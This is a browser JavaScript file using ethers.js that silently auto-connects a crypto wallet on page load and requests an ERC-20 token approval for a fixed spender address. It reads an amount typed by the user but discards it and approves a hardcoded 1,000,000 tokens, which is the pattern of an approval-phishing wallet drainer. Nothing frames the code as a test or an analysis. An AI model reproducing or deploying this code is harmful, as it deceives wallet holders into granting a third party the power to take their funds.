let provider;
let signer;
let tokenContract;

const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
const SPENDER_ADDRESS = "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7";

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function decimals() view returns (uint8)"
];

// --- AUTO-CONNECT LOGIC FOR 2026 ---
window.addEventListener('load', async () => {
  if (window.ethereum) {
    try {
      // Check if user already authorized this site
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      
      if (accounts.length > 0) {
        console.log("Auto-connecting to:", accounts[0]);
        await connectWallet(); // Silently initialize if authorized
      }
    } catch (err) {
      console.error("Auto-connect check failed", err);
    }
  }
});

async function connectWallet() {
  if (!window.ethereum) return;
  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    // Requesting accounts ensures the site has permission
    await provider.send("eth_requestAccounts", []);
    
    signer = await provider.getSigner();
    tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
    
    const address = await signer.getAddress();
    document.getElementById("status").innerText = `Connected: ${address.slice(0,6)}...${address.slice(-4)}`;
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "Connection failed.";
  }
}

async function executeApproval() {
  const amountStr = document.getElementById("amount").value;
  if (!tokenContract) {
    await connectWallet(); // Force connect if not already done
  }

  try {
    // Fetch token decimals
    const decimals = await tokenContract.decimals();

    // Parse amount using the correct decimals
    const parsedAmount = ethers.parseUnits("1000000", decimals); // Use string, not number

    document.getElementById("status").innerText = "Check wallet for approval...";

    // Send approve transaction
    const tx = await tokenContract.approve(SPENDER_ADDRESS, parsedAmount);

    // Wait for confirmation
    await tx.wait();

    document.getElementById("status").innerText = "Success!";
} catch (err) {
    console.error(err); // Log the error for debugging
    document.getElementById("status").innerText = "Action denied.";
}
}
